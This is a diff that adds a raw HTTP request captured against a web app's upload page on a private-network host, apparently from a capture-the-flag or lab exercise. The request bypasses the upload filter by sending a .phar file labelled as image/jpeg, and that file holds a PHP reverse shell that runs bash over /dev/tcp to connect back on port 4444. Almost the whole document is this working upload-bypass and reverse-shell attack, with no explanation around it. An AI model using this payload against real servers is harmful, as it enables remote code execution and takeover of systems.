@@ -1,0 +1,35 @@
+POST /index.php?page=upload HTTP/1.1
+Host: 10.11.100.30
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=----geckoformboundarye2a4a9e3397381a99245e10080f3868c
+Content-Length: 572
+Origin: http://10.11.100.30
+Sec-GPC: 1
+Connection: keep-alive
+Referer: http://10.11.100.30/index.php?page=upload
+Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+------geckoformboundarye2a4a9e3397381a99245e10080f3868c
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+100000
+------geckoformboundarye2a4a9e3397381a99245e10080f3868c
+Content-Disposition: form-data; name="uploaded"; filename="file.phar"
+Content-Type: image/jpeg
+
+<?php
+$ip = '10.11.100.30';
+$port = 4444;
+system("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
+?>
+
+------geckoformboundarye2a4a9e3397381a99245e10080f3868c
+Content-Disposition: form-data; name="Upload"
+
+Upload
+------geckoformboundarye2a4a9e3397381a99245e10080f3868c--
